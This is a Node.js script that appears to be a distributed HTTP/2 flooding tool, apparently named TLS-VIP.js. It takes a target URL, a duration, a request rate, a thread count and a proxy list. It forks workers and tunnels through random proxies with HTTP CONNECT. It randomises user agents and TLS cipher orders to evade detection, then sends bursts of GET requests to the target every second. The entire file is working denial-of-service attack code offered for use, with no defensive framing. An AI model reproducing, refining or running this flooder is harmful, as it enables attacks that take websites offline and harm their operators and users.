const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");

// Set reasonable maximum listeners
process.setMaxListeners(100);
require("events").EventEmitter.defaultMaxListeners = 100;

// Improved error handling
process.on('uncaughtException', function (exception) {
    console.error('Uncaught Exception:', exception);
});

if (process.argv.length < 7) {
    console.log(`
        ███████╗██╗  ██╗██╗   ██╗███╗   ██╗███████╗████████╗
        ██╔════╝██║ ██╔╝╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
        ███████╗█████╔╝  ╚████╔╝ ██╔██╗ ██║█████╗     ██║  
        ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
        ███████║██║  ██╗   ██║   ██║ ╚████║███████╗   ██║   
        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
    Usage: node TLS-VIP.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];
const cipper = cplist[Math.floor(Math.random() * cplist.length)];
const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 1; i <= args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1000);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error.message);
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["accept"] = "*/*";
headers["accept-language"] = "en-US,en;q=0.9";
headers["accept-encoding"] = "gzip, deflate";
headers["cache-control"] = "no-cache";
headers["upgrade-insecure-requests"] = "1";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    const useragent = userAgentv2.toString();
    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = useragent;

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1], 10),
        address: `${parsedTarget.host}:443`,
        timeout: 3000
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error('Proxy error:', error);
            return;
        }

        connection.setKeepAlive(true, 10000);

        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: cipper,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1,
            rejectUnauthorized: false,
            socket: connection,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 10000);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxDeflateDynamicTableSize: 4294967295,
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                        .on("response", response => {
                            request.close();
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            console.error('Client error:', error);
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);